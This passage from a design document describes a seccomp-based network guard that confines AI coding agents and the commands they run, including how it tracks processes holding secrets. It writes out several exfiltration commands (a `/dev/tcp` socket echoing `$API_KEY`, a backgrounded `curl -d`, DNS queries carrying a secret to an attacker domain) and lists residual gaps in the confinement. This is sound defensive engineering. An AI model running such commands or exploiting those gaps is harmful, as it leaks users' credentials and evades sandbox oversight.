host's tables own) and `test/component/this-machine.test.ts` (a real
proxy: plain HTTP, CONNECT, TLS inspection, the refusal note, the route
exemption); the stack e2e `tests/stack/net-proxy-local-only-ipv6.test.ts`
(a holder's request through the real proxy, real dial, to an address the
host owns on a down or carrier-less interface, and, in an unprivileged
user + network namespace where the kernel allows one, to an AnyIP `local`
route's address and a down dummy interface's address: the direct connect
reaches the wildcard listener, the proxy answers 403, nothing reaches it,
and the call's result carries the this-machine note; another address is
still dialed); and the sandbox e2e
`tests/sandbox/dashboard-via-net-proxy.test.ts` (the real launcher, guard
and net-proxy: a program the agent runs reaches neither the real dashboard
nor a loopback service that serves a secret, directly or through the
proxy, as `127.0.0.1`, `localhost`, `[::1]`, `[::ffff:127.0.0.1]`,
`0.0.0.0`, the LAN address or a CONNECT).

**Privilege — more portable than Landlock-net.** Seccomp `NEW_LISTENER` needs
only `no_new_privs` (settable by any process: no CAP_SYS_ADMIN, no userns, no
root); `pidfd_getfd` works parent→child unprivileged. The floor is kernel
version: ≥ 5.0 (USER_NOTIF), ≥ 5.5 (CONTINUE), ≥ 5.6 (the supervisor-connect
enact), versus Landlock-net's ≥ 6.7. It mutates **no global host state**.
`net-supervisor`'s TPROXY-rewrite half (symbolization of non-model traffic)
needs root + host-global nftables and is decided won't-implement
(privilege-model.md §0).

**Wrap order (load-bearing).** `applyNetGuard` runs AFTER `applyLandlockNet`
and PREPENDS, so it lands OUTERMOST of the net wraps: `net-guard --
landlock-apply --net-only -- <secret-twins bwrap> <agent>`. The guard is the
ancestor of (and outside) the Landlock restriction, so its supervisor-connect
is not itself port-denied. The reply-filter stays outside the guard.

**A sandbox nested inside the tree is honored** (confidentiality-plan-11 §8
item 5). Because the guard performs every allowed connect on its own thread,
a program that confined its own TCP with Landlock would be widened to the
guard's allow set. The guard traps `landlock_restrict_self` in every mode and
runs an allowed connect of such a task on a mirror thread restricted by the
task's NESTED layers (`landlock_mirror.rs` `connect_via`); a mirror it cannot
build refuses the connect. The one layer it does not apply is the launch's
own whole-agent port wrap, which the destination-aware allow list supersedes
by design. The launcher's inspect-mcp confine
(`launcher/src/inspect-net-confine.ts`) relies on this. Pinned by
`guard_integration.rs` and `launcher/test/kernel/inspect-mcp-confine.test.ts`.

**The allow-set policy** (`computeNetGuardSpecs`, unit-tested), mirroring
§7.1's port policy as destination rules:
- ALWAYS the **loopback service ports** (the target model proxy, plus
  net-proxy / U-LLM forwarder when live), pinned to `127.0.0.0/8` + `[::1]`;
- ALWAYS **DNS** (`udp`/`tcp` :53);
- the **model API host on :443** (resolved), which also covers the
  OAuth-refresh direct-:443 residual that `--landlock-net-strict` could not
  admit (§7.4), EXCEPT under the **model-host deny** (2026-10-18;
  `launcher/src/model-host-deny.ts`, agent-sdks.md §4 "The model-host
  deny"): whenever the confidentiality axis is on and the egress proxy runs,
  this allowance is dropped and every model vendor's host
  (`api.anthropic.com`, `platform.claude.com`, `api.openai.com`,
  `chatgpt.com`, every port) is a **`--deny`** rule instead, checked before
  any allow, so it beats the `tcp:*:443` fallback. A program of the tree
  that dials one around the egress proxy (its proxy variables unset or
  ignored: a `claude` started by its full path with its own environment) is
  refused at connect; the agent's own calls there ride the egress proxy,
  which lets each host take only its listed account and sign-in paths. The
  guard denies by resolved address: a direct dial to another site on the
  same address (`claude.ai` shares `api.anthropic.com`'s; `chatgpt.com` and
  `api.openai.com` sit on Cloudflare's) is refused too, a proxied one is not;
- an explicit **`--net-allow=<spec>,…`** list appended verbatim;
- the workspace's **git-remote hosts**, auto-derived (`gitRemoteToSpec`:
  https → :443, ssh/scp → :22, honoring an explicit `:port`) and added ONLY
  when the set is narrowed, so `git push`/`fetch` survive a tightened guard;
  default-on, `--no-net-guard-git` / `MANDU_NET_GUARD_GIT=0` opts out. The
  remotes are read from the **user's workspace** (`plan.humanCwd`), not the
  agent's cwd: with fs-sync on that is the AgentView worktree of the shadow
  repo, which has no remotes;
- the permissive **`tcp:*:443` + `tcp:*:22`** fallback ONLY in the
  non-strict, uncurated default. **Strict OR an explicit `--net-allow` DROPS
  the fallback**: :443 is admitted only to the API host (none under the
  model-host deny), the curated set and git remotes.

So **non-strict default** = landlock-net's reachability plus TOCTOU-safe
supervisor-connect and a one-flag path to tighten; **strict / curated** =
IP/domain-precise egress, while the model API stays reachable via the guard's
supervisor-connect.

**Default-on + degrade.** Tri-state like the other rungs (`--net-guard` /
`--no-net-guard` / `MANDU_NET_GUARD`; `--no-kernel` drops it). A missing bin
only WARNS and proceeds without the guard (`buildHintFor`), and the bin's
`--skip-unsupported` execs the target directly where the seccomp trap is
unavailable. An explicit bad `--net-allow` spec is a loud parse error
(fail-closed).

**The agent's own private server (2026-10-05; `own_server.rs`,
supported-agents.md §2.3.1).** OpenCode 2's CLI is a client of a server it
spawns (`--standalone`: `opencode serve --stdio --port 0`, a child on the
same executable, bound to an ephemeral port on 127.0.0.1); the server runs
the model calls and the tools, and its HTTP API includes routes that put a
program's output into the conversation as the user's own message. Under the
default kernel layer neither leg worked (landlock-net grants no bind; the
allow list has no rule for an ephemeral port), and an allow rule for "the
tree's own loopback listeners" would hand that API to every command the
agent runs. So the guard admits exactly two things, and only when the
launch names the agent's executable in `MANDU_NET_GUARD_OWN_SERVER` (the
launcher sets it for an OpenCode 2 launch; a value already in the
environment is left as it is):

- **the bind**: a stream socket of the client's own server (a direct child
  of a client process, on the agent's executable, not itself a client) to a
  loopback address at port 0. The guard performs it on its copy of the
  socket (`pidfd_getfd`) with the address bytes it read once, so the
  launch's port wrap does not see it; a Landlock layer the server nested
  itself still decides (`landlock_mirror::connect_via`). Every other bind
  runs as before, and the launch's wrap refuses it. The bind is trapped
  for this whenever the variable is set (`FilterTraps::own_server`);
- **the connect**: TCP from a client process to a loopback destination
  whose listening sockets (one per address the kernel could route it to,
  a wildcard one included) each have at least one holder in the tree and no
  holder but the client's own server. The guard then performs it like any
  allowed connect. The client is `agent_keys`' rule applied to that
  executable: the first-started process of the tree running it (a later
  one, such as a nested `opencode run`, never is).

With a secret policy for the same executable, the own server is also the
agent of plan 13 D2 / D7 (`guard_flow::agent_keys`): it holds the tool
calls' output and spawns their shells, so it is never made a holder by
them, and its children's execs are call roots (supported-agents.md §2.3.1,
"The agent is the server").

Everything else stays refused: the server's descendants (the agent's
commands: `curl` to the server's port, a nested `opencode run` and its own
private server, which cannot bind), a listener outside the tree (the
user's background service) even for the client, and a listener an agent's
command also holds. With the variable set, no process but the client may
trace the client or read or write its memory (`ptrace`, `process_vm_*`
are trapped and refused, `own_server::introspection_refused`, whatever
Yama's ptrace scope), and `pidfd_getfd` is refused for the whole tree (as
under a secret policy): either would let a command connect in the client's
name. A fork of the server on its way to an exec holds a copy of the
listening socket until that exec closes it (OpenCode's sockets are
close-on-exec); the client's connect landing in that window was refused,
and OpenCode 2 failed with "Transport: Was there a typo in the url or
port?" on the loaded CI guest (2026-10-07). The guard now holds the
connect back and gives such a holder (a child of the own server, still on
the agent's image, holding the listener only through close-on-exec
descriptors: `own_server::own_server_fork`) until `FORK_EXEC_WAIT` (2 s)
to drop it, the wait the sweep gives a fork of the agent; one still
holding it then refuses as before. The image is judged on the first look
only (`wait_close_on_exec_drop`, 2026-10-08): `execve` switches
`/proc/<pid>/exe` before it closes the close-on-exec descriptors, and a
later look in that window (the task preempted there) saw `/usr/bin/sleep`
still holding the listener and refused the client (the kernel test, 3 of
40 runs under CPU load; CI pipeline 9606). The later looks require the
same process and close-on-exec descriptors only: past the exec the kernel
has closed those, so a holder that keeps the listener is one without the
flag and ends the wait. A first look that itself lands in that window
(2026-10-17, the residual this left) is no longer judged there: a child of
the own server INSIDE its exec (a live process with an empty command line,
`pipe_flow::exec_in_progress`: the new image's argv is set up only at the
end of the exec) is waited for, within the same 2 s, until that exec ends,
and judged on the descriptor table it ends with (`own_server::first_look`,
`guard_flow::wait_exec_done`, the wait the sweep gives a child of the
agent inside its exec, confidentiality-plan-13 §4.5.1), so a descriptor
that survives the exec still makes it a holder. The looks back off from
100 us to 2 ms (`pipe_flow::exec_wait_pause`); another start time on the
pid ends the wait with the table judged as final; a process that stays
"inside" (an unprivileged `prctl(PR_SET_MM, PR_SET_MM_MAP)` empties a
process's own command line) is refused at the bound. What that window
shows depends on who looks: from the switch to the new image until the
kernel marks the process dumpable again, after it closed the close-on-exec
descriptors, `/proc/<pid>/fd` belongs to root, mode 0500 (measured on
Linux 7.0: about one look in ten at a child that a process with a 256 MiB
heap forks and that execs at once). A guard that is root in the tree's
user namespace (the kernel tests, the CI guests) reads the table there and
saw the new image holding every descriptor of the old one: the refusal
(the tight-loop kernel test below in an Ubuntu 24.04 CI guest: 145 of 300
connects refused before, 0 of 300 after). A guard that is not (a launch's) got EACCES and read the
table as holding nothing (`pipe_flow::fd_table`): the connect was admitted
at once, past a descriptor without the flag too, which survives the exec
(fail-open; the hidden holder of the kernel test below was admitted in
21 ms). A table that cannot be read is now told from an empty one
(`pipe_flow::fd_table_look`, `holds_any_look`, `reads_any_look`): one
inside an exec is waited for the same way, by this connect and by the
sweep (`guard_flow::unseen_drops`, every process of the tree, whatever the
bytes: the wait can only find a holder the look missed); one that still
cannot be read when no exec is in progress (a process that made itself
non-dumpable, another user's) is not seen, as before (guarantees.md).
Kernel tests: `the_client_reaches_its_server_while_the_server_forks_and_
execs_in_a_tight_loop` (300 connects while the server forks and execs
`/bin/true` back to back), `a_fork_that_looks_inside_an_exec_forever_
still_refuses_the_client_at_the_bound` and `a_holder_inside_an_exec_whose_
table_cannot_be_read_is_not_taken_for_none` (refused at 2 s). Residual: a
process that kills the server and binds its freed
port at once could be connected to by the client (it would then see the
client's own requests, not the model's traffic, which the server makes).
Writing `/proc/<client>/mem` is a ptrace-mode access the kernel checks
(Yama); it is not trapped. Tests: `own_server.rs` units (every decision),
`guard_filter.rs` units (the bind, introspection and `pidfd_getfd`
postures), the kernel test `tests/own_server_integration.rs`, and
`tests/sandbox/guard/opencode2-own-server.test.ts` (the real launcher, guard,
landlock-net wrap and OpenCode 2.0.23, modes `off` and `secrets`).

**Sends are judged like connects (2026-10-01).** A guard that traps
`connect(2)` only misses `sendto(2)` on an unconnected UDP socket (DNS
tunneling; QUIC that skips connect), even for the static allow list. The
filter traps `sendmsg` and `sendmmsg` always and `sendto` with a non-null
address (`guard_filter.rs` `send_block`: `send()` and glibc's `sendto(…, NULL,
0)`, the hot path on a connected socket, run at full speed), in every
posture. The guard reads the call once (every `msghdr`, address, iovec,
payload and control message, checked as the kernel checks them), copies the
socket, judges each message's destination as the KERNEL would read it
(`send_guard::inet_send_destination`: a stream send ignores its address unless
`MSG_FASTOPEN`; UDP over IPv4 reads an `AF_UNSPEC` address as `AF_INET`; an
IPv6 socket takes an IPv4 address) against the static list and then the taint
leg, and then SENDS what it read on its copy (`guard_send.rs`), never
`CONTINUE`. A Unix address takes the checks of a Unix connect and is reached
by the inode they opened; descriptors passed over `SCM_RIGHTS` are copied and
passed on. A blocking send waits on a thread of its own, within
`SO_SNDTIMEO`; a blocking stream send is sent whole. The tracee gets the count
(for `sendmmsg`, each `msg_len`), or the errno its own call would have got,
EACCES for a refused destination, SIGPIPE on EPIPE. DNS (:53) is still
allowed by default to any resolver, and is itself a covert channel for a
process holding NO secret: pin resolvers with `--net-allow`.

**Old kernels and copy failures.** Kernels < 5.6 degrade the ALLOW enact to a
CONTINUE (the tracee runs its own connect to the allowed address; the Landlock
port wrap remains the backstop; logged). On a kernel that HAS `pidfd_getfd`,
a failure to copy one socket (the tracee exited, `ptrace_scope` ≥ 2, an LSM)
is refused with `EACCES`, never continued
(`guard_kernel::allowed_without_copy`). A notification names the calling
THREAD, and `pidfd_open` takes only a thread-group leader (`EINVAL` for a
worker before Linux 6.9, `ENOENT` on newer kernels): the copy goes through the
leader, and is kept only if it is the file the thread's own
`/proc/<tgid>/task/<tid>/fd/<n>` names (a thread made without `CLONE_FILES`
has a table of its own: refused). Without this fallback every connect from a
worker thread would be refused, and glibc's and Bun's resolvers and Bun's
HTTP client run on worker threads (`fs-supervisor/src/tracee.rs` `tracee_fd`;
kernel tests `guard_supervises_an_allowed_connect_from_a_worker_thread` and
`tracee_fd_copies_a_worker_threads_descriptor`).

**A process holding a secret (the taint legs).** Under a secret policy the
guard tracks which processes hold a secret's raw bytes (a *holder*: a listed
reader the arbiter granted a raw open, its descendants, and every process a
flow below reaches), and a holder may send only to its secret's `bindings`
(confidentiality-plan-10 §4.3). A connect-time check alone was found to leak
on 2026-10-01 by three paths, each demonstrated with the real guard in
`secrets` mode: (1) **unconnected datagrams** (`sendto`/`sendmsg` with an
address were not trapped, so neither the taint leg nor the static list saw
them; a DNS query is one such datagram); (2) **sockets connected before the
taint** (`exec 3<>/dev/tcp/…; . ./.env; echo $API_KEY >&3`); (3) **`127.0.0.1`
on any port** (the session-proxy exception was by address, so a host resolver
forwarder on `127.0.0.1:53` carried `<secret>.attacker.example` off the
machine). It was reachable in the default configuration: `node` is a default
reader of `~/.npmrc` (`arbiter/policy/flow-taint.ts` `CONSUMER_TABLE`), and
`node -e` sent the real `_authToken` in one datagram under a strict allow
list. Each path is closed in privilege-free decision logic
(`net-supervisor/src/send_guard.rs`, `guard_filter.rs`, unit-tested) and
enacted behind the crate's `kernel` feature (`guard_send.rs`,
`guard_kernel.rs`):

1. **Sends are judged like connects** (above).
2. **The taint-time sweep.** When the guard grants a raw open, it records the
   taint, waits (bounded at 5 s, then refused) for the connects and sends it
   judged for that process and its descendants before the taint to finish
   (`send_guard::EgressGate`), then judges every INET socket they hold by its
   peer (`guard_send::sweep_before_taint`: `pidfd_getfd` + `SO_DOMAIN` /
   `SO_ACCEPTCONN` / `getpeername`, and `/proc/net/tcp` for a connect still
   in `SYN_SENT`) exactly as a tainted connect to it: a session proxy or a
   binding passes; anything else REFUSES THE OPEN (EACCES, "hold a connection
   to …"), so the reader never gets a byte. A socket the guard cannot judge
   refuses it too, and the listing repeats until no new process appears.
3. **The session-proxy exception is a port, not an address.** A holder
   reaches 127.0.0.1 / ::1 without a binding only over TCP on the launch's
   net-proxy port (`MANDU_NET_GUARD_PROXY_PORTS`, from `sessionProxyPorts`).
   The net-proxy judges the process again (it attributes the connection and
   applies its bindings); the model proxy and the U-LLM forwarder do not, so
   they are no exception (the agent itself never holds a secret: it reads the
   twin). UDP to a proxy's port number never passes.

Closed on the way, each a path for the same bytes: the taint is keyed by the
thread group, not the thread (`secret_open::own_key_of`: a worker thread's
open or connect is the process's); a descendant judged once keeps the taint
after its holder exits (`TaintedSet::inherit`); `pidfd_getfd` of another
process's descriptor is refused under a secret policy (EPERM, in the filter);
a socket's protocol is read from `SO_PROTOCOL` too, so an ICMP echo socket is
not "UDP" to the rules (ICMP, UDP-Lite, SCTP are `Proto::Other`);
`setsockopt(IP_OPTIONS)` and `setsockopt(IPV6_RTHDR | IPV6_2292RTHDR |
IPV6_2292PKTOPTIONS)` (a route the guard does not judge) are refused, and the
same ancillary data in a send; an abstract Unix name is judged against the
`unix:@…` bindings; the child hands its listener to the guard by number and
`pidfd_getfd` (`guard_kernel::hand_listener`), not by a `sendmsg` the filter
now traps.

**Cost** (Linux 7.0, 2 000 calls each, `send_integration.rs`
`a_send_without_an_address_runs_at_full_speed_and_costs_are_measured`): a
`send()` on a connected UDP socket 4.3 µs under the guard against 3.5 µs bare
(not trapped); a `sendto` with an address or a `sendmsg` about 35 µs against
3.8 µs (one notification round trip plus the guard's copy and send). Model
traffic and most TCP clients write with `write`/`writev`/`send` and never
trap; the trapped sends are UDP (DNS: one or two per lookup), Node's IPC, and
explicit-address datagrams. A taint costs one sweep of the reader's sockets,
once.

**Five further gaps, closed (2026-10-02).** Each fix fails closed and only
adds refusals, probe-gates its kernel features, and never weakens an existing
check. Decision logic is privilege-free and unit-tested (`accept_guard.rs`,
`lineage.rs`, `send_guard.rs`); enactment is behind the `kernel` feature
(`guard_accept.rs`, `guard_rights.rs`, `guard_kernel.rs`, `guard_send.rs`).

- **(a) An inbound connection to a holder.** The filter traps
  `accept`/`accept4` under a secret policy, and the guard performs the
  accept on its copy of the listening socket
  (`guard_accept::handle_accept_notif`). A non-holder gets every connection.
  A holder gets one from THIS machine (a loopback peer, or the connection's
  own local address), a Unix connection, and one from a host its secrets are
  bound to; every other peer is reset (`SO_LINGER` 0) and the call answers
  `ECONNABORTED`, which every accept loop takes as "that one went away". A
  networked dev server answering a remote peer is a direct exfil channel, so
  this came first (kernel test
  `a_holders_accept_takes_this_machine_and_its_bindings_only`; through the
  real launch, the sandbox suite `holder-accept.test.ts`, see "Tests of the
  taint legs" below). On a kernel without `pidfd_getfd` (< 5.6) accept is not
  trapped. A connection that completes while the process is becoming a
  holder is judged too: the taint waits on the egress gate, which the accept
  enters.
- **(b) A socket received after the taint over `SCM_RIGHTS`.** The guard
  performs every `sendmsg`, so it sees every descriptor passed on
  (`guard_rights::judge_pass`): a socket that could carry bytes out (a
  connected INET socket, a Unix socket connected to a named peer, or one with
  descriptors queued) is judged at the SENDER against the receiver's
  bindings (the receiving socket found with `unix_diag`, its holders by their
  `/proc/<pid>/fd`). An unbound one refuses the send. What a Unix socket had
  queued BEFORE the taint is read with a `MSG_PEEK`
  (`guard_rights::queued_rights`): a queued descriptor refuses the raw open
  or the connection. `SO_PASSRIGHTS` (Linux 6.16) was rejected: sealing a
  holder's sockets refuses benign passes (Node's cluster hands a worker its
  listener) and misses a socket the holder binds after its taint.
- **(c) A Unix socket connected before the taint.** The sweep classifies a
  Unix socket (`classify_unix`): one connected to a NAMED peer (a path,
  `@name`) is judged like a tainted Unix connect to it
  (`HeldSocket::UnixPeer`), so an unbound named peer refuses the raw open; an
  unnamed pair (a socketpair, a client of the holder's own listener) is local
  IPC, like a pipe.
- **(d) A fork after the taint that never traps before its holder exits.**
  The common shape, `. .env; ( curl -d "$API_KEY" … ) &`, a child that
  outlives the shell, is closed by an ORPHAN BACKSTOP that needs no fork
  trap: a process whose ORPHAN ROOT (the first process up its chain whose
  parent is a reaper: pid 1, a pid-namespace init, the guard subreaper, or a
  process that made itself one via the trapped
  `prctl(PR_SET_CHILD_SUBREAPER)`) was born while a holder held its secret
  inherits from every holder that died while that root lived
  (`TaintedSet::holds_or_inherits`, bounded by `lineage::in_window` between
  the holder's taint and its death; never a root older than the holder,
  `lineage::orphan_of`, and never one of the holder's own ancestors, recorded
  when it became a holder, `Held.ancestors`, because a shell, its subshell and
  the subshell's `cat .env` can start within one clock tick). Those ancestors
  are read while the holder is stopped in its trapped open, so they are
  known; a holder recorded with none (gone before it was read: only a test
  ever did this, the 2026-10-03 CI flake of
  `the_reapers_own_child_is_no_orphan_of_a_holder_it_started`) leaves the
  tick judgement alone, and a root born in the holder's tick is its orphan,
  fail-closed. The same holds, as a known over-restriction, when an
  ancestor between the holder and the root was already reaped at the taint
  (`( cat .env & )`: the walk then goes from the holder to the guard and
  never meets the root). A descendant
  that makes any trapped call while its holder lives is found by the parent
  walk, and the sweep records the live descendants at the taint. **The
  window's end (2026-10-09, `death_watch`):** a holder's death is stamped
  when it happens, through a pidfd per holder (`pidfd_open`, Linux 5.3+, no
  privilege) watched by one thread; the 200 ms poll (`observe_deaths`) stays
  the fallback (no `pidfd_open`, the budget of a quarter of the soft
  descriptor limit, at most 4096, spent) and the backstop also checks
  `/proc` at judge time. Every stamp is taken after a look that found the
  holder dead (the pidfd reports the exit after the children were
  re-parented), and the earliest is kept, so the window never ends before
  the death: a root born no later than the death is still in it. Before,
  the poll's stamp came up to 200 ms late, and a root born in that gap,
  which cannot descend from the dead holder, inherited it: the next Codex
  call's sandboxed process (a pid namespace init's child, an orphan root)
  started 170 to 260 ms after the reader's sandbox died and was masked about
  one run in five under load (confidentiality-plan-13 §4.5.1). A pidfd is
  opened by pid and then checked against the key's start time, so a reused
  pid is never watched. **Not on the watcher's schedule (2026-10-09, CI
  pipeline 10012):** a stamp is the time of a look, and the watcher's
  thread looks when it is scheduled; under load that was after a pid
  namespace child the tree started 40 ms after the death, and the child was
  judged the holder's orphan (the kernel test's round (a), refused once).
  So the guard also takes the deaths the pidfds report as each trapped
  call arrives, before it judges or answers it
  (`TaintedSet::stamp_ready_deaths`: one non-blocking epoll look when none
  is ready; a death and its stamp are taken under one lock, so a call that
  finds a death the thread took waits for its stamp). A process started
  after any trapped call that followed the death (Codex `execve`s the next
  sandbox's bwrap after reaping the last) is born after the stamp, however
  late the thread runs; one started before any such call is still judged by
  when the thread looked (an over-restriction, never a leak). The watcher
  also starts before the guard's first worker and watches any holder
  recorded before it; a holder recorded already dead is stamped at once;
  an exiting holder (`PF_EXITING`, its children not yet re-parented) is
  watched, never taken as dead. No look stamps a holder only exiting (the
  poll and a judgement stamp a dead one: gone, reused or a zombie,
  `lineage::is_dead`), and a judgement's stamp goes through
  `TaintedSet::stamp_deaths` like every other, so the adoption at the
  death (below) runs once the children have moved: before, the poll could
  stamp a holder seen exiting and the one adoption pass found the
  orphan-to-be still the dying holder's child, and a judgement set the
  stamp directly and no adoption ever ran; either way an orphan that forked
  and died before any trapped call left its child outside every window, a
  leak (the kernel test's round (c), 3 times in 105 runs with the guard's
  threads starved). A judgement also reads its time after the look that
  found the holder gone, never before. A holder recorded as a descendant
  or an orphan (`TaintedSet::inherit`) has its window start at its own
  birth, not when the guard recorded it: it carries the taint from its
  fork, and a child it forked before it was recorded (an adopted orphan
  whose adoption came late, a descendant whose first trapped call came
  after its fork), orphaned at its death, was born before such a window and
  went out (round (c) once in 102 runs with the fixes above); an earlier
  start only widens the window, and its own ancestors stay outside it. A
  holder that read the secret itself keeps the read as its start. And the window keeps no tick of margin
  after the stamp (`lineage::in_window`): a start time and a stamp are the
  same `CLOCK_BOOTTIME` rounded down to clock ticks, so a birth no later
  than the death is no later than the stamp's tick, and the margin only
  took in roots born in the tick after it. **At the death** the processes it made orphans (a
  reaper's children in the guard's tree, born in its window, not its
  ancestors) are recorded as holders flowing from it (`TaintedSet::
  adopt_orphans`), with their own deaths watched: an orphan that forks and
  dies before any trapped call leaves a child born after the holder died,
  which the exact window alone no longer reaches (and the late poll reached
  only by luck); recorded at the death, the orphan's own window covers that
  child. Kernel test `taint_gaps_integration.rs`
  (`the_orphan_window_ends_at_the_holders_death`: a pid namespace child
  born 15 ms after a trapped call that followed the death goes out; one
  born while the holder lived, and the child of an adopted orphan, are
  refused). **One process's tree (2026-10-10):** after the fixes above
  round (a) still failed in 15 of 132 CI runs, and the window was not the
  cause. Traced in a loaded VM (8 failures in 200 runs, every holder record
  logged), the holder's death was stamped in its own tick each time and the
  round's pid namespace child was born two ticks later, outside the
  holder's window; but at the stamp the adoption had taken in a process of
  ANOTHER test of the same test binary, born in the stamp's tick. The test
  process is the guard and the subreaper of every test it runs at once, so
  each test's children are a reaper's children, orphan roots by the rule,
  and one born in a holder's window and alive at its death is adopted as
  its orphan; the round's child, an orphan root born while that process
  lived, was then judged its orphan. Both answers are the rule's
  fail-closed over-approximation (by time alone the one could descend from
  the other), the same one a session gives a concurrent call's sandbox
  that starts while a holder lives, which over-restricts and never leaks.
  The kernel tests of that file now run one at a time, as the other guard
  test files already did. A second fail-closed answer the round avoids by
  construction: a holder whose parent exited before its taint has lost its
  lineage (its ancestors, read at the taint, start at the reaper), so a
  child of the reaper born in the holder's own clock tick (in fact its
  grandparent, the tree's root) cannot be told from a child it left
  running, and the adoption at its death takes it in (unit test
  `a_root_in_the_tick_of_a_holder_whose_lineage_is_lost_is_its_orphan`).
  Nothing sound breaks that tie: a pid order wraps, and the kernel exposes
  no finer start time and no original parent. The round's root now starts
  the holder in a later tick than its own. **Why not a fork trap:** trapping the fork family
  with seccomp user-notification destabilizes the bubblewrap wrap the agent
  runs under (its namespace-building `clone`s), shown by the kernel test
  `a_tainted_process_in_its_own_pid_namespace_stays_uninspectable`. **The
  sibling, closed without a trap (2026-10-03):** a holder's `CLONE_PARENT`
  child would be its parent's child, not an orphan, so neither the walk nor
  the backstop reaches it. Under a secret policy the filter refuses `clone`
  with `CLONE_PARENT` (`EPERM`; the flags word compared on x86_64 and on
  aarch64's CLONE_BACKWARDS order) and `clone3` (`ENOSYS`, its flags being in
  a struct cBPF cannot read; glibc 2.34+ and Rust's std fall back to `clone`)
  (`guard_filter::clone_block`). Nothing is trapped, so the wrap's namespace
  clones run at full speed. A seccomp program cannot ask whether the caller
  holds a secret, so every process of the tree under a secret policy carries
  the refusal (with no secret policy, `off`, nothing changes). Utility cost:
  a program that needs `CLONE_PARENT` (runc's `nsexec`, so a rootless runc
  started from the tree) fails, as would one that calls `clone3` with no
  `ENOSYS` fallback; none was found among shells, language runtimes,
  bubblewrap, Claude Code and musl in their ordinary paths. **Go, run
  (2026-10-17, Go 1.26 on the host and the 26.04 CI guest, 1.22 on 24.04):** its
  runtime makes threads with a raw `clone(CLONE_VM|CLONE_THREAD|…)` and
  os/exec its processes with a raw `clone(CLONE_VFORK|CLONE_VM|CLONE_PIDFD)`
  (no libc, no `clone3`; `CLONE_PIDFD` from Go 1.23), so goroutines, OS
  threads, every os/exec shape (with the pidfd path kept: Go holds a pidfd
  for its child under the filter exactly when it does outside it, its
  `waitid(P_PIDFD)` probe answered through the guard's wait trap),
  concurrent spawns, loopback TCP, HTTP, a
  Unix socket and the resolver all work, static and cgo (whose threads go
  through glibc's `pthread_create`, `clone3` then `clone`); a raw
  `clone(CLONE_PARENT)`, `clone3(CLONE_PARENT)` and Go's own
  `SysProcAttr.Cloneflags: CLONE_PARENT` spawn are refused. Go's one
  `clone3` path, `SysProcAttr.UseCgroupFD` (`CLONE_INTO_CGROUP`) or a
  `CLONE_NEWTIME` clone flag, has no fallback: such a spawn fails with
  `ENOSYS` in the tree (a cost of the same kind as runc's; nothing an agent
  ordinarily runs sets either). Still not run: Bun, Deno, Chromium/Electron
  (its zygote and sandbox clones) and podman. Tests: `guard_filter` unit
  (`a_sibling_is_refused_under_a_secret_policy`,
  `every_jump_lands_inside_the_program`), kernel `clone_filter_integration.rs`
  (its (c) leg builds `tests/fixtures/clone-probe.go` and runs it under the
  filter beside the same binary outside it), e2e
  `tests/sandbox/wrap-clone-filter.test.ts` (the Go probe under the real
  launch).
- **(e) The Unix-connect descriptor swap without the allow-list.** Under a
  secret policy (`secrets`, the frozen `full`, and with
  `MANDU_UNIX_POLICY=0` too) every pathname and abstract Unix connect is
  supervised in every posture: the guard connects its copy of the socket to
  the address it read, so a thread can no longer put an INET socket under
  the descriptor and an INET address in the buffer between the check and the
  kernel's connect. A supervised connect with no handle on the socket is
  refused (EACCES). With no secret policy (`off`, observe-only) AF_UNIX
  passes through: there is no secret to carry out.

**A file opened for writing before the taint (plan 13 D5).** The write exit
labeled a file at its write-intent open only, so in `python3 reader.py >
out.txt` (the shell opens `out.txt` before `exec`; python reads the secret
after) `out.txt` received the bytes unlabeled. The sweep now also lists, for
the reader and every descendant it sweeps, the regular files held open for
writing (`pipe_flow::written_files`: the `/proc/<pid>/fd` link, the access
mode from `fdinfo` and the file's identity, read as one by `fd_file` since
2026-10-17 so a reused descriptor number never pairs one file's path with
another's facts; not an unlinked file, not `/proc` or `/sys`), and the
open handler asks `labelWrittenPathTainted` for each before the ADDFD resumes
the reader. Kernel test `tests/pipe_taint_integration.rs`; live
`launcher/test/pipe-taint-live.test.sh`.

**A pipe, a FIFO or a socket pair to a sibling (plan 13 D2, §4.5.1).** A
pipeline's later stage is the reader's sibling, so the parent walk never made
it a holder: `reader | curl --data-binary @- …` connected anywhere the static
list allowed, and `reader | tee copy.txt` wrote unlabeled. The taint now
follows the descriptor (`guard_flow.rs`, the pure parts in `pipe_flow.rs`).
The sweep is a worklist: after the reader's tree, `flow_targets` lists the
links its processes WRITE into (`pipe:[ino]` and FIFO paths by access mode,
the unnamed peer of each Unix socket by `unix_diag`), marks them
(`TaintedSet::mark_link`), and `flow_readers` finds every process of the
guard's tree holding one to READ; each becomes a holder flowing from the
tree's root (`TaintedSet::insert_flow`) and is swept the same way. A holder's
FIFO write-open does the same for the FIFO's readers. At a later event
(connect, send, accept, a pass's receiver, a write-open) an untainted process
is first checked by `guard_flow::holder`: a marked pipe or FIFO it reads, or
one a live holder's tree holds open for writing, makes it a holder. The
arbiter is told the writers as `flowsFrom` on `taintedProcessBindings` and
`labelWrittenPathTainted` and unions their taint without recording a parent
(`ProvenanceStore.processSecretTaintWithFlows`); the orphan backstop hands
its lost holders over the same way. **The agent is exempt** (the
first-started live process of `agentExe`, or an interpreter's script and its
first child; `guard_flow::agent_keys`): it reads twins, and what reaches it
is masked at the model exit instead (below). Kernel test
`tests/pipe_taint_integration.rs`; live `launcher/test/pipe-taint-live.test.sh`.

**A channel joined after the taint (plan 13 §9 R1).** D2 follows the
descriptors that exist at the taint; a SOCKET joined later escaped it (a
client that connected to a holder's listener after the holder read its
secret, or a socket pair made after the taint and passed on). Both are judged
at the event that joins the channel, before a byte can flow, because the
guard performs both:

- *The accept* (`guard_accept`): a holder's connection whose client is a
  process of the guard's tree (a Unix client by `unix_diag`, a TCP client of
  this machine by the connection's two ends in `/proc/net/tcp{,6}`) makes
  that client a holder flowing from the holder
  (`guard_flow::accepted_flow`), swept as a pipe receiver's
  (`guard_send::sweep_receivers`). One that already holds a connection to an
  unbound peer has the connection reset (`ECONNABORTED`).
- *The pass* (`guard_rights::judge_pass`): a socket pair end, a connected
  Unix socket or a pipe end passed over `SCM_RIGHTS` joins the receivers to
  the processes at its other end; when either side holds, the other becomes
  a holder, or the send is refused when that side already holds an unbound
  connection (`guard_flow::pass_flows`, `pipe_flow::pass_directions`: a
  holder's connection to a NAMED server is an exit its connect judged, never
  a flow into the server).
- *The later event* also reads Unix sockets: an untainted process whose
  socket's peer a live holder's tree holds is a holder at its connect, send,
  accept or write-open (this serves the old-kernel degrade).
